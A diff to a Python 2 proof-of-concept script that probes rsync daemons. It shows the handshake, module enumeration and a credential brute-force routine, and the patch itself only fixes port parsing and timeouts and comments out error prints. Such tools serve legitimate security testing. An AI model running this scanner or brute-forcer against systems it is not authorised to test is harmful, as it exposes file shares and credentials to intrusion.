@@ -27,6 +27,7 @@ def poc(url):
     url = url.split('://')[-1]
     host = url.split(':')[0]
     port = url.split(':')[-1] if ':' in url else 873
+    port = int(port)
     res = initialisation(host, port)
 
     # (True, '@RSYNCD:', ' 31.0', ['share', '@RSYNCD:EXIT'])
@@ -50,10 +51,11 @@ def initialisation(host, port):
     '''
     flag = False
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    socket.setdefaulttimeout(5)
     rsync = {"MagicHeader": "@RSYNCD:", "HeaderVersion": " 30.0"}
     payload = struct.pack("!8s5ss", rsync["MagicHeader"], rsync["HeaderVersion"], "\n")  # init
     try:
-        socket.setdefaulttimeout(20)
+        
         s.connect((host, port))
         s.send(payload)
         data = s.recv(1024)
@@ -62,6 +64,7 @@ def initialisation(host, port):
             flag = True
             rsynclist = ClientQuery(s)  # 查询模块名
     except Exception, e:
+        #print("[error](%s)" % str(e))
         pass
     finally:
         s.close()
@@ -91,6 +94,7 @@ def ClientQuery(socket_pre):
             if modulename[-2] == "@RSYNCD:EXIT":
                 break
     except Exception, e:
+        #print("[error](%s)" % str(e))
         pass
     return modulelist
 
@@ -136,5 +140,6 @@ def ClientCommand(host, port, cmd):
                 else:
                     return "Module:'%s' User/Password:%s/%s" % (cmd, user, password)
         except Exception, e:
+            #print("[-]error(%s)" % str(e))
             break
     return 'brute failed'
